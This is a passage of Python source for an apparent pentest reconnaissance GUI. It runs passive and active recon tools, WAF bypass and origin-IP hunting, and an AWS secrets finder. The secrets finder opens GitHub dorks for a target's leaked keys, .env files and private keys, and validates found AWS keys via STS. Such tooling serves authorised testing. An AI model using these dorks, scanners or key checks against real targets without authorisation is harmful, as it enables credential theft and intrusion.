        self.recon_term.log("[*] Recon ready  —  Passive (safe) | Active (touches target) | Origin (find real IP)", 'info')
        self.recon_term.log("[*] For Tor-anonymized recon: use  🧅 Tor Recon  tab in sidebar", 'dim')
        self.recon_term.log("[*] For full intelligence pipeline: use  📡 Deep Intel  tab", 'dim')

    def _build_passive(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,14))
        tk.Label(tr, text="TARGET DOMAIN:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(tr, var=self.passive_target, w=40).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "← Project", lambda: self.passive_target.set(self.project.get()), FG3, small=True).pack(side='left')
        mk_section(pad, "PASSIVE INTELLIGENCE GATHERING", "🕵").pack(fill='x', pady=(0,10))
        tg = mk_frame(pad, bg=BG2); tg.pack(fill='x')
        items = [
            ("🔍","Subfinder",    "Passive subdomain enum",      self._run_subfinder,    "subfinder"),
            ("🌐","Amass",        "DNS intelligence",            self._run_amass,        "amass"),
            ("🔗","Assetfinder",  "Asset/subdomain finder",      self._run_assetfinder,  "assetfinder"),
            ("📧","theHarvester", "Emails, IPs, domains OSINT",  self._run_theharvester, "theHarvester"),
            ("📜","crt.sh",       "Certificate transparency",    self._run_crtsh,        None),
            ("🛰","Shodan",       "Internet exposure search",    self._run_shodan,       None),
            ("🔎","Censys",       "Internet-wide scan DB",       self._run_censys,       None),
            ("🕵","SpyHunt",      "Multi-source OSINT",          self._run_spyhunt,      "spyhunt"),
            ("🔒","TLSX",         "TLS cert & hostname enum",    self._run_tlsx,         "tlsx"),
            ("🧬","DNSx",         "DNS resolution in bulk",      self._run_dnsx,         "dnsx"),
        ]
        for i, (ico,name,desc,cmd,bn) in enumerate(items):
            ok = shutil.which(bn) is not None if bn else True
            c = mk_card(tg); c.grid(row=i//5, column=i%5, padx=4, pady=4, sticky='nsew')
            tg.columnconfigure(i%5, weight=1)
            tk.Label(c, text=ico, bg=BG3, font=('Consolas',18)).pack(pady=(10,2))
            tk.Label(c, text=name, bg=BG3, fg=FG, font=MONO_B).pack()
            tk.Label(c, text=desc, bg=BG3, fg=FG3, font=(_MONO_FACE,8), wraplength=130).pack(pady=2)
            tk.Label(c, text="● Ready" if ok else "○ Install",
                     bg=BG3, fg=GREEN if ok else RED, font=(_MONO_FACE,8)).pack(pady=2)
            mk_btn(c, "▶ RUN", cmd, GREEN, small=True).pack(pady=(2,10))

        # ── AWS SECRETS FINDER ────────────────────────────────────
        mk_section(pad, "AWS SECRETS FINDER", "🔑").pack(fill='x', pady=(12,8))
        aws_card = mk_card(pad); aws_card.pack(fill='x', pady=(0,8))
        aws_f = mk_frame(aws_card, bg=BG3); aws_f.pack(fill='x', padx=14, pady=10)

        tk.Label(aws_f,
                 text="Scan GitHub repos, URLs, and JS files for exposed AWS keys, tokens, "
                      "and cloud secrets. Checks IAM validity via STS.",
                 bg=BG3, fg=FG2, font=MONO_S, wraplength=700).pack(anchor='w', pady=(0,8))

        # Target row
        aws_tr = mk_frame(aws_f, bg=BG3); aws_tr.pack(fill='x', pady=(0,8))
        tk.Label(aws_tr, text="Target (domain/URL/GitHub org):",
                 bg=BG3, fg=FG3, font=MONO_S).pack(side='left')
        self._aws_target = tk.StringVar()
        mk_entry(aws_tr, var=self._aws_target, w=40).pack(side='left', padx=8, ipady=3)
        mk_btn(aws_tr, "← Project",
               lambda: self._aws_target.set(self.project.get()),
               FG3, small=True).pack(side='left')

        # Scan type buttons
        aws_br = mk_frame(aws_f, bg=BG3); aws_br.pack(fill='x', pady=(0,6))
        for label, cmd, clr in [
            ("🐙 Scan GitHub",          self._aws_scan_github,    ACCENT),
            ("🌐 Scan URL/JS",          self._aws_scan_url,       CYAN),
            ("📂 Scan Local File",      self._aws_scan_file,      GREEN),
            ("📋 Paste & Scan",         self._aws_scan_paste,     YELLOW),
            ("✅ Validate Key (STS)",   self._aws_validate_key,   RED),
        ]:
            mk_btn(aws_br, label, cmd, clr, small=True).pack(side='left', padx=4)

        # Results
        aws_res_f = mk_frame(aws_f, bg=BG3); aws_res_f.pack(fill='x', pady=(8,0))
        tk.Label(aws_res_f, text="Found Secrets:", bg=BG3, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,3))
        self._aws_results_txt = mk_stext(aws_res_f, h=8, bg=BG4, fg=RED)
        self._aws_results_txt.pack(fill='x')
        aws_bf = mk_frame(aws_f, bg=BG3); aws_bf.pack(fill='x', pady=(6,0))
        def _aws_copy():
            self.root.clipboard_clear()
            self.root.clipboard_append(self._aws_results_txt.get('1.0','end'))
            self.set_status("AWS findings copied!", GREEN)
        def _aws_clear():
            self._aws_results_txt.config(state='normal')
            self._aws_results_txt.delete('1.0','end')
            self._aws_results_txt.config(state='disabled')
        mk_btn(aws_bf, "📋 Copy Findings", _aws_copy,  ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(aws_bf, "🗑 Clear",          _aws_clear, FG3,    small=True).pack(side='left', padx=4)
        self._aws_paste_buf = tk.Text(aws_f, height=0, width=0)  # hidden paste buffer


    # ── AWS Secrets Finder Methods ────────────────────────────────────────────
    def _aws_log(self, text, tag='normal'):
        """Write to AWS results text widget."""
        self._aws_results_txt.config(state='normal')
        self._aws_results_txt.insert('end', text + '\n')
        self._aws_results_txt.see('end')
        self._aws_results_txt.config(state='disabled')

    def _aws_analyze_text(self, text, source="unknown"):
        """Run AWS secret patterns against text and display findings."""
        from modules.analysis.security_tools import JS_SECRET_PATTERNS
        import re
        found = []
        aws_patterns = {
            k: v for k, v in JS_SECRET_PATTERNS.items()
            if any(x in k for x in ["AWS","Google API","GitHub","Stripe","Slack","JWT",
                                     "Private Key","Generic API Key","Generic Secret",
                                     "Generic Token","Password","Database URL","Firebase",
                                     "Twilio","SendGrid","Mailgun","Heroku"])
        }
        for name, pattern in aws_patterns.items():
            try:
                matches = list(re.finditer(pattern, text))
                for m in matches:
                    line_no = text[:m.start()].count('\n') + 1
                    val     = m.group()
                    display = val if len(val) < 30 else val[:12] + "..." + val[-6:]
                    found.append((name, line_no, display, val))
            except Exception:
                pass
        if not found:
            self._aws_log("[OK] No secrets found in: " + str(source), 'ok')
            return []
        self._aws_log("[!!!] SECRETS FOUND: " + str(len(found)), 'vuln')
        self._aws_log("=" * 60, 'dim')
        for sec_name, line, display, full_val in found:
            sev = "CRITICAL" if any(x in sec_name for x in ["Private Key","AWS","Stripe"]) else "HIGH"
            self._aws_log("[" + sev + "] " + sec_name, 'err')
            self._aws_log("  Line  : " + str(line), 'info')
            self._aws_log("  Value : " + str(display), 'warn')
            self._aws_log("", 'dim')
        self._aws_log("[*] Total: " + str(len(found)) + " secret(s) found", 'info')
        self.set_status("AWS Scan: " + str(len(found)) + " secrets found in " + str(source) + "!", RED)
        return found

    def _aws_scan_github(self):
        """Search GitHub for exposed secrets related to target."""
        target = self._aws_target.get().strip() or self.project.get()
        if not target: return
        self._aws_log("[*] GitHub secret scan for: " + target, 'info')
        import webbrowser, urllib.parse
        dorks = [
            '"' + target + '" AWS_SECRET_ACCESS_KEY',
            '"' + target + '" aws_access_key_id',
            '"' + target + '" AKIA',
            '"' + target + '" filename:.env',
            '"' + target + '" filename:config.yml password',
            '"' + target + '" "-----BEGIN RSA PRIVATE KEY-----"',
            '"' + target + '" api_key OR apikey OR api-key',
            '"' + target + '" password DB_PASSWORD',
            'org:' + target + ' filename:.env',
            'org:' + target + ' secret_key OR api_key',
        ]
        self._aws_log("[*] Opening " + str(min(5,len(dorks))) + " GitHub dork searches...", 'info')
        for i, dork in enumerate(dorks[:5], 1):
            url = "https://github.com/search?q=" + urllib.parse.quote(dork) + "&type=code"
            webbrowser.open(url)
            self._aws_log("  [" + str(i) + "] " + dork[:70], 'ok')
        if len(dorks) > 5:
            self._aws_log("  [*] Remaining " + str(len(dorks)-5) + " dorks:", 'dim')
            for dork in dorks[5:]:
                self._aws_log("    " + dork, 'dim')

    def _aws_scan_url(self):
        """Fetch URL/JS file and scan for secrets."""
        target = self._aws_target.get().strip() if hasattr(self,'_aws_target') else ""
        if not target:
            import tkinter.messagebox as mb
            mb.showwarning("No Target","Enter a URL to scan.", parent=self.root); return
        if not target.startswith("http"):
            target = "https://" + target
        self._aws_log("[*] Fetching and scanning: " + target, 'info')
        def _go():
            try:
                import urllib.request as _ur
                req = _ur.Request(target, headers={
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'})
                with _ur.urlopen(req, timeout=15) as r:
                    text = r.read().decode('utf-8', errors='replace')
                self.root.after(0, lambda: self._aws_analyze_text(text, target))
                import re
                js_files = re.findall(r'src=[\'"]([^\'"]+\.js[^\'"]*)[\'"]', text, re.IGNORECASE)
                if js_files:
                    self.root.after(0, lambda: self._aws_log(
                        "[*] Found " + str(len(js_files)) + " JS files — run JS Analyzer for deep scan", 'info'))
            except Exception as e:
                self.root.after(0, lambda: self._aws_log("[ERROR] " + str(e), 'err'))
        threading.Thread(target=_go, daemon=True).start()

    def _aws_scan_file(self):
        """Scan a local file for secrets."""
        path = filedialog.askopenfilename(
            title="Select file to scan for secrets",
            filetypes=[("All files","*.*"), ("JavaScript","*.js"),
                       ("Python","*.py"), ("Config","*.env *.yml *.yaml *.json")])
        if not path: return
        self._aws_log(f"[*] Scanning file: {path}", 'info')
        try:
            with open(path, encoding='utf-8', errors='replace') as f2:
                text = f2.read()
            self._aws_analyze_text(text, path)
        except Exception as e:
            self._aws_log(f"[ERROR] {e}", 'err')

    def _aws_scan_paste(self):
        """Open a dialog to paste and scan text."""
        win = tk.Toplevel(self.root)
        win.title("Paste & Scan for Secrets")
        win.configure(bg=BG)
        win.geometry("700x500")
        tk.Frame(win, bg=ACCENT, height=2).pack(fill='x')
        tk.Label(win, text="Paste text to scan for secrets:",
                 bg=BG, fg=FG2, font=MONO_B).pack(pady=(10,4), padx=12, anchor='w')
        txt = mk_stext(win, h=20, bg=BG3, fg=CYAN)
        txt.pack(fill='both', expand=True, padx=12)
        def do_scan():
            code = txt.get('1.0','end').strip()
            if not code: return
            win.destroy()
            self._aws_analyze_text(code, "pasted_text")
        mk_btn(win, "▶ Scan for Secrets", do_scan, ACCENT).pack(
            pady=8, padx=12, fill='x', ipady=5)

    def _aws_validate_key(self):
        """Open dialog to validate AWS key via CLI."""
        win = tk.Toplevel(self.root)
        win.title("Validate AWS Key (STS)")
        win.configure(bg=BG)
        win.geometry("500x320")
        tk.Frame(win, bg=RED, height=2).pack(fill='x')
        tk.Label(win, text="🔑 AWS KEY VALIDATOR", bg=BG, fg=RED, font=MONO_H).pack(pady=(10,4))
        tk.Label(win, text="Calls AWS STS GetCallerIdentity. Use only on authorized keys.",
                 bg=BG, fg=FG2, font=MONO_S).pack(padx=20)
        fields = {}
        for lbl, key in [("Access Key ID:", "ak"), ("Secret Access Key:", "sk"), ("Region:", "region")]:
            row = mk_frame(win, bg=BG); row.pack(fill='x', padx=20, pady=4)
            tk.Label(row, text=lbl, bg=BG, fg=FG3, font=MONO_S, width=18, anchor='e').pack(side='left')
            var = tk.StringVar(value="us-east-1" if key == "region" else "")
            fields[key] = var
            mk_entry(row, var=var, w=32).pack(side='left', padx=8, ipady=3)
        res_lbl = tk.Label(win, text="", bg=BG, fg=FG2, font=MONO_S, wraplength=450)
        res_lbl.pack(pady=8, padx=20)
        def validate():
            ak  = fields["ak"].get().strip()
            sk  = fields["sk"].get().strip()
            reg = fields["region"].get().strip() or "us-east-1"
            if not ak or not sk:
                res_lbl.config(text="Enter both access key and secret key.", fg=RED); return
            res_lbl.config(text="Calling AWS STS...", fg=CYAN)
            def _go():
                try:
                    import subprocess as _sp
                    env2 = {**os.environ,
                            "AWS_ACCESS_KEY_ID": ak,
                            "AWS_SECRET_ACCESS_KEY": sk,
                            "AWS_DEFAULT_REGION": reg}
                    r2 = _sp.run(["aws","sts","get-caller-identity","--output","json"],
                                 capture_output=True, text=True, env=env2, timeout=15)
                    if r2.returncode == 0:
                        import json as _j
                        info = _j.loads(r2.stdout)
                        msg = ("✓ VALID KEY!\n"
                               "Account: " + info.get("Account","?") + "\n"
                               "ARN: " + info.get("Arn","?") + "\n"
                               "UserID: " + info.get("UserId","?"))
                        self.root.after(0, lambda: res_lbl.config(text=msg, fg=GREEN))
                        self.root.after(0, lambda: self._aws_log(
                            "[VALID] AWS Key active: " + info.get("Arn","?"), "ok"))
                    else:
                        err = r2.stderr[:200]
                        self.root.after(0, lambda: res_lbl.config(
                            text="✗ Invalid/expired key\n" + err, fg=RED))
                except FileNotFoundError:
                    self.root.after(0, lambda: res_lbl.config(
                        text="aws CLI not found. Install: apt install awscli", fg=YELLOW))
                except Exception as e2:
                    self.root.after(0, lambda: res_lbl.config(text=str(e2), fg=RED))
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(win, "▶ Validate Key", validate, RED).pack(pady=8, padx=20, fill='x', ipady=5)


    def _build_active(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,10))
        tk.Label(tr, text="TARGET:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(tr, var=self.active_target, w=40).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "← Project", lambda: self.active_target.set(self.project.get()), FG3, small=True).pack(side='left')
        nf = mk_frame(pad, bg=BG2); nf.pack(fill='x', pady=(0,12))
        tk.Label(nf, text="NMAP FLAGS:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(nf, var=self.nmap_flags, w=46).pack(side='left', padx=8, ipady=3)
        presets = [("-sV -sC -T4 --open","Quick"),("-p- -T4","Full Ports"),
                   ("--script=vuln","Vuln"),("-sU --top-ports 200","UDP")]
        pv = tk.StringVar(value="Presets")
        pc = ttk.Combobox(nf, textvariable=pv, values=[p[1] for p in presets], width=10, font=MONO_S)
        pc.pack(side='left', padx=4)
        pc.bind("<<ComboboxSelected>>", lambda e: self.nmap_flags.set(
            next((p[0] for p in presets if p[1]==pv.get()), self.nmap_flags.get())))
        mk_section(pad, "ACTIVE RECONNAISSANCE", "🗺").pack(fill='x', pady=(0,10))
        tg = mk_frame(pad, bg=BG2); tg.pack(fill='x')
        items = [
            ("🗺","Nmap",       "Port+service scan",   self._run_nmap),
            ("🚀","Masscan",    "Ultra-fast scanner",  self._run_masscan),
            ("⚡","Naabu",      "PD port scanner",     self._run_naabu),
            ("💥","FFUF",       "Dir/file fuzzer",     self._run_ffuf),
            ("🔫","Gobuster",   "Dir/DNS/vhost bf",    self._run_gobuster),
            ("📁","Dirsearch",  "Web path discovery",  self._run_dirsearch),
            ("🌐","httpx",      "HTTP probe + tech",   self._run_httpx),
            ("📸","Screenshot", "Screenshot all hosts",self._run_screenshot),
        ]
        for i, (ico,name,desc,cmd) in enumerate(items):
            c = mk_card(tg); c.grid(row=i//4, column=i%4, padx=5, pady=5, sticky='nsew')
            tg.columnconfigure(i%4, weight=1)
            tk.Label(c, text=ico, bg=BG3, font=('Consolas',18)).pack(pady=(10,2))
            tk.Label(c, text=name, bg=BG3, fg=FG, font=MONO_B).pack()
            tk.Label(c, text=desc, bg=BG3, fg=FG3, font=(_MONO_FACE,8)).pack(pady=2)
            mk_btn(c, "▶ RUN", cmd, ACCENT, small=True).pack(pady=(4,10))

    def _build_origin_hunter(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        dep_card = mk_card(pad); dep_card.pack(fill='x', pady=(0,12))
        df = mk_frame(dep_card, bg=BG3); df.pack(fill='x', padx=12, pady=8)
        tk.Label(df, text="REQUIRED:", bg=BG3, fg=FG3, font=MONO_S).pack(side='left')
        for tool, ok in origin_hunter.check_dependencies().items():
            tk.Label(df, text=f"{'●' if ok else '○'} {tool}", bg=BG3,
                     fg=GREEN if ok else RED, font=(_MONO_FACE,8)).pack(side='left', padx=8)

        ir = mk_frame(pad, bg=BG2); ir.pack(fill='x', pady=(0,8))
        tk.Label(ir, text="IP LIST FILE:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(ir, var=self.oh_ipfile, w=40).pack(side='left', padx=8, ipady=3)
        mk_btn(ir, "📂 Browse", self._oh_browse, FG2, small=True).pack(side='left')

        ir2 = mk_frame(pad, bg=BG2); ir2.pack(fill='x', pady=(0,14))
        tk.Label(ir2, text="SINGLE IP:    ", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(ir2, var=self.oh_single_ip, w=24).pack(side='left', padx=8, ipady=3)

        # ── MODULE 0 — SUBDOMAIN LOOKUP (lookup.sh logic) ────────
        mk_section(pad, "MODULE 0 — SUBDOMAIN → IP LOOKUP (lookup.sh)", "🔍").pack(fill='x', pady=(8,6))
        lookup_card = mk_card(pad); lookup_card.pack(fill='x', pady=(0,10))
        lf = mk_frame(lookup_card, bg=BG3); lf.pack(fill='x', padx=14, pady=10)
        tk.Label(lf, text=(
            "Reads a subdomain list (.txt), resolves each subdomain to IP using 'host' command\n"
            "Pure Python fallback (socket.gethostbyname) — works without host/dig installed\n"
            "Output → logs/<project>/subdomain_lookup.txt"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', pady=(0,8))

        lu_r = mk_frame(lf, bg=BG3); lu_r.pack(fill='x', pady=(0,6))
        tk.Label(lu_r, text="Subdomain file:", bg=BG3, fg=FG3, font=MONO_S).pack(side='left')
        self._lookup_file = tk.StringVar()
        mk_entry(lu_r, var=self._lookup_file, w=38).pack(side='left', padx=8, ipady=3)
        mk_btn(lu_r, "📂 Browse", lambda: self._lookup_file.set(
            filedialog.askopenfilename(
                title="Select subdomain list",
                filetypes=[("Text files","*.txt"),("All files","*.*")]
            )), FG2, small=True).pack(side='left')

        # Quick-load from project
        def _load_from_project():
            proj = self.project.get()
            if not proj: return
            for fname in ["subdomains_all.txt","subfinder.txt","amass.txt","crtsh.txt"]:
                p = LOGS_DIR / proj / fname
                if p.exists():
                    self._lookup_file.set(str(p))
                    self.set_status(f"Loaded: {fname}", GREEN)
                    return
            self.set_status("No subdomain file found in project logs", YELLOW)
        mk_btn(lu_r, "← Project Subs", _load_from_project, CYAN, small=True).pack(side='left', padx=6)

        lu_r2 = mk_frame(lf, bg=BG3); lu_r2.pack(fill='x', pady=(0,6))
        self._lookup_use_host = tk.BooleanVar(value=True)
        self._lookup_use_python = tk.BooleanVar(value=True)
        ttk.Checkbutton(lu_r2, text="Use 'host' command (Linux/WSL)",
                       variable=self._lookup_use_host).pack(side='left', padx=(0,16))
        ttk.Checkbutton(lu_r2, text="Python socket fallback (always works)",
                       variable=self._lookup_use_python).pack(side='left')

        lu_btn_r = mk_frame(lf, bg=BG3); lu_btn_r.pack(fill='x')
        mk_btn(lu_btn_r, "▶ Run Subdomain Lookup", self._run_subdomain_lookup, GREEN, small=True).pack(side='left', padx=(0,8))
        mk_btn(lu_btn_r, "📄 View Results", lambda: self._oh_view("subdomain_lookup.txt"), FG2, small=True).pack(side='left')

        # ── Existing modules ──────────────────────────────────────
        for sec_title, desc, run_cmd, result_file, clr in [
            ("MODULE 1 — STEALTH WAF DETECTION (origin.sh)",
             "TCP/443 check  •  wafw00f rotating UA  •  2–5s jitter  →  stealth_waf_results.txt",
             self._oh_run_waf, "stealth_waf_results.txt", GREEN),
            ("MODULE 2 — ORIGIN IP MAPPER (originipmapper.sh)",
             "PTR + SSL SANs  •  Host-header curl  •  No WAF = ORIGIN IP  →  origin_results.txt",
             self._oh_run_mapper, "origin_results.txt", ACCENT),
        ]:
            mk_section(pad, sec_title, "").pack(fill='x', pady=(8,6))
            card = mk_card(pad); card.pack(fill='x', pady=(0,10))
            cf2 = mk_frame(card, bg=BG3); cf2.pack(fill='x', padx=14, pady=10)
            tk.Label(cf2, text=desc, bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', pady=(0,8))
            brf = mk_frame(cf2, bg=BG3); brf.pack(fill='x')
            mk_btn(brf, "▶ Run", run_cmd, clr, small=True).pack(side='left', padx=(0,8))
            rf_copy = result_file
            mk_btn(brf, "📄 View Results", lambda rf=rf_copy: self._oh_view(rf), FG2, small=True).pack(side='left')

        mk_section(pad, "FULL WORKFLOW", "🔁").pack(fill='x', pady=(8,6))
        wfc = mk_card(pad); wfc.pack(fill='x', pady=(0,6))
        wff = mk_frame(wfc, bg=BG3); wff.pack(fill='x', padx=14, pady=10)
        tk.Label(wff, text="Subdomain Lookup → WAF Scan → Origin Mapper in sequence.", bg=BG3, fg=YELLOW, font=MONO_S).pack(anchor='w', pady=(0,8))
        mk_btn(wff, "▶▶ Run Full Origin Hunt", self._oh_run_full, YELLOW, small=True).pack(side='left', padx=(0,8))
        mk_btn(wff, "▶ Run Lookup + Hunt", lambda: (self._run_subdomain_lookup(), self.root.after(3000, self._oh_run_full)), ORANGE, small=True).pack(side='left')

    def _run_subdomain_lookup(self):
        """
        Implements lookup.sh logic:
        for sub in $(cat file); do host $sub | grep 'has address'; done
        With Python socket fallback for Windows compatibility.
        """
        fname = self._lookup_file.get().strip()
        if not fname or not os.path.isfile(fname):
            messagebox.showwarning("No File",
                "Select a subdomain list file first.\n\n"
                "Or click '← Project Subs' to load from project logs.",
                parent=self.root)
            return

        use_host   = self._lookup_use_host.get()
        use_python = self._lookup_use_python.get()
        proj       = self.project.get() or "output"
        proj_dir   = LOGS_DIR / proj
        proj_dir.mkdir(parents=True, exist_ok=True)
        out_file   = proj_dir / "subdomain_lookup.txt"

        # Load subdomains
        try:
            with open(fname, encoding='utf-8', errors='replace') as f:
                subdomains = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        except Exception as e:
            messagebox.showerror("Read Error", str(e), parent=self.root); return

        if not subdomains:
            messagebox.showwarning("Empty", "No subdomains found in file.", parent=self.root); return

        self.set_status(f"Subdomain lookup: {len(subdomains)} entries...", CYAN)
        self.recon_term.log(f"[*] Subdomain Lookup — {fname}", 'info')
        self.recon_term.log(f"[*] {len(subdomains)} subdomains to resolve", 'info')
        self.recon_term.log(f"[*] Output → {out_file}", 'dim')
        self.recon_term.log(f"[*] Mode: {'host cmd' if use_host else ''} {'+ python socket' if use_python else ''}\n", 'dim')

        def _go():
            import socket as _sock
            results   = []   # (subdomain, ip, method)
            resolved  = 0
            failed    = 0

            # Check if 'host' command available
            host_avail = shutil.which("host") is not None and use_host

            for sub in subdomains:
                if not sub: continue
                ip   = None
                meth = ""

                # Method 1: 'host' command (like lookup.sh)
                if host_avail:
                    try:
                        result = subprocess.run(
                            ["host", sub],
                            capture_output=True, text=True, timeout=8)
                        # grep "has address"
                        for line in result.stdout.splitlines():
                            if "has address" in line:
                                parts = line.split("has address")
                                if len(parts) == 2:
                                    ip   = parts[1].strip()
                                    meth = "host"
                                    break
                    except Exception:
                        pass

                # Method 2: Python socket fallback
                if not ip and use_python:
                    try:
                        ip   = _sock.gethostbyname(sub)
                        meth = "socket"
                    except Exception:
                        pass

                if ip:
                    resolved += 1
                    entry = f"{sub} → {ip}  [{meth}]"
                    results.append((sub, ip, meth))
                    self.root.after(0, lambda e=entry: self.recon_term.log(f"  [+] {e}", 'ok'))
                else:
                    failed += 1
                    self.root.after(0, lambda s=sub: self.recon_term.log(f"  [-] {s} — no address", 'dim'))

            # Save results — same format as lookup.sh output
            try:
                with open(out_file, 'w', encoding='utf-8') as f:
                    f.write(f"# Subdomain Lookup Results\n")
                    f.write(f"# Source: {fname}\n")
                    f.write(f"# Total: {len(subdomains)}  Resolved: {resolved}  Failed: {failed}\n\n")
                    for sub, ip, meth in results:
                        # Format mirrors: "host $sub | grep 'has address'"
                        f.write(f"{sub} has address {ip}\n")
            except Exception as e:
                self.root.after(0, lambda err=e: self.recon_term.log(f"[!] Save error: {err}", 'err'))

            def _done():
                self.recon_term.log(f"\n[✓] Resolved: {resolved}/{len(subdomains)}", 'ok')
                self.recon_term.log(f"[✓] Failed:   {failed}", 'warn' if failed else 'dim')
                self.recon_term.log(f"[✓] Saved  →  {out_file}", 'ok')
                self.set_status(
                    f"Lookup done: {resolved} resolved, {failed} failed → subdomain_lookup.txt",
                    GREEN if resolved else YELLOW)
                # Also update oh_ipfile with resolved IPs file
                ips_file = proj_dir / "resolved_ips.txt"
                try:
                    with open(ips_file, 'w') as f:
                        for _, ip, _ in results:
                            f.write(ip + '\n')
                    self.oh_ipfile.set(str(ips_file))
                    self.recon_term.log(f"[✓] IP list → {ips_file.name}  (auto-set for WAF/Origin scan)", 'ok')
                except Exception: pass
            self.root.after(0, _done)

        threading.Thread(target=_go, daemon=True).start()

    # ── Passive runners ───────────────────────────────────────────
    def _run_subfinder(self):
        t = self._get_target(self.passive_target)
        if not t: return
        out = self._proj_out("subfinder.txt", t)
        self.run_with_audit(self.recon_term, recon_passive.build_cmd_subfinder(t, out), label=f"Subfinder → {t}")
        self.after_tool(out, "Subdomain Enum", "Subfinder")

    def _run_amass(self):
        t = self._get_target(self.passive_target)
        if not t: return
        out = self._proj_out("amass.txt", t)
        self.recon_term.run_command(recon_passive.build_cmd_amass(t, out), label=f"Amass → {t}")

    def _run_assetfinder(self):
        t = self._get_target(self.passive_target)
        if not t: return
        self.recon_term.run_command(recon_passive.build_cmd_assetfinder(t), label=f"Assetfinder → {t}")

    def _run_theharvester(self):
        t = self._get_target(self.passive_target)
        if not t: return
        out = self._proj_out("harvester", t)
        self.recon_term.run_command(recon_passive.build_cmd_theharvester(t, out), label=f"theHarvester → {t}")

    def _run_crtsh(self):
        t = self._get_target(self.passive_target)
        if not t: return
        self.recon_term.log(f"[*] Querying crt.sh for *.{t}", 'info')
        def _go():
            res = recon_passive.crtsh_lookup(t)
            self.recon_term.log(f"[+] crt.sh: {len(res)} subdomains found", 'ok')
            for r in res[:80]: self.recon_term.log(f"    {r}")
            if len(res) > 80: self.recon_term.log(f"    ... +{len(res)-80} more", 'dim')
            out = self._proj_out("crtsh.txt", t)
            with open(out,'w') as f: f.write('\n'.join(res))
            self.recon_term.log(f"[OK] Saved → {out}", 'ok')
        threading.Thread(target=_go, daemon=True).start()

    def _run_shodan(self):
        t = self._get_target(self.passive_target)
        if not t: return
        self.recon_term.log("[*] Querying Shodan...", 'info')
        def _go():
            res = recon_passive.shodan_lookup(f"hostname:{t}")
            if res: [self.recon_term.log(f"    {r}") for r in res]
            else: self.recon_term.log("[!] No results or API key missing", 'warn')
        threading.Thread(target=_go, daemon=True).start()

    def _run_censys(self):
        t = self._get_target(self.passive_target)
        if not t: return
        self.recon_term.log("[*] Querying Censys...", 'info')
        def _go():
            res = recon_passive.censys_lookup(f"parsed.names: {t}")
            if res: [self.recon_term.log(f"    {r}") for r in res]
            else: self.recon_term.log("[!] No results or credentials missing", 'warn')
        threading.Thread(target=_go, daemon=True).start()

    def _run_spyhunt(self):
        t = self._get_target(self.passive_target)
        if not t: return
        self.recon_term.run_command(recon_passive.build_cmd_spyhunt(t), label=f"SpyHunt → {t}")

    def _run_tlsx(self):
        t = self._get_target(self.passive_target)
        if not t: return
        cmd = ["tlsx", "-host", t, "-san", "-cn", "-silent"]
        self.recon_term.run_command(cmd, label=f"TLSX → {t}")

    def _run_dnsx(self):
        subs_file = filedialog.askopenfilename(title="Select subdomains file", filetypes=[("Text","*.txt"),("All","*.*")])
        if not subs_file: return
        out = self._proj_out("dnsx.txt")
        cmd = ["dnsx", "-l", subs_file, "-o", out, "-silent", "-a", "-cname", "-resp"]
        self.recon_term.run_command(cmd, label="DNSx resolve")

    # ── Active runners ────────────────────────────────────────────
    def _run_nmap(self):
        t = self._get_target(self.active_target)
        if not t: return
        self.recon_term.run_command(recon_active.build_cmd_nmap(t, self.nmap_flags.get()), label=f"Nmap → {t}")

    def _run_masscan(self):
        t = self._get_target(self.active_target)
        if not t: return
        self.recon_term.run_command(recon_active.build_cmd_masscan(t), label=f"Masscan → {t}")

    def _run_naabu(self):
        t = self._get_target(self.active_target)
        if not t: return
        cmd = ["naabu", "-host", t, "-silent", "-top-ports", "1000"]
        self.recon_term.run_command(cmd, label=f"Naabu → {t}")

    def _run_ffuf(self):
        t = self._get_target(self.active_target)
        if not t: return
        url = t if t.startswith('http') else f"https://{t}"
        self.recon_term.run_command(recon_active.build_cmd_ffuf(url, load_cfg()["wordlists"]["directories"]), label=f"FFUF → {url}")

    def _run_gobuster(self):
        t = self._get_target(self.active_target)
        if not t: return
        url = t if t.startswith('http') else f"https://{t}"
        out = self._proj_out("gobuster.txt")
        self.recon_term.run_command(recon_active.build_cmd_gobuster(url, load_cfg()["wordlists"]["directories"], out), label=f"Gobuster → {url}")

    def _run_dirsearch(self):
        t = self._get_target(self.active_target)
        if not t: return
        url = t if t.startswith('http') else f"https://{t}"
        out = self._proj_out("dirsearch.txt")
        self.recon_term.run_command(recon_active.build_cmd_dirsearch(url, out), label=f"Dirsearch → {url}")

    def _run_httpx(self):
        f = filedialog.askopenfilename(title="Select subdomains file", filetypes=[("Text","*.txt"),("All","*.*")])
        if not f: return
        out = self._proj_out("httpx.txt")
        self.run_with_audit(self.recon_term, recon_active.build_cmd_httpx(f, out), label="httpx probe")
        self.after_tool(out, "HTTP Probe", "httpx")

    def _run_screenshot(self):
        f = filedialog.askopenfilename(title="Select alive hosts", filetypes=[("Text","*.txt"),("All","*.*")])
        if not f: return
        proj = self.project.get() or "screenshots"
        out  = str(SCREENSHOTS / proj)
        os.makedirs(out, exist_ok=True)
        # Try gowitness first, fallback to aquatone
        import shutil as _sh
        if _sh.which("gowitness"):
            cmd = ["gowitness", "file", "-f", f, "--screenshot-path", out, "--disable-logging"]
            self.recon_term.run_command(cmd, label=f"Gowitness → {out}")
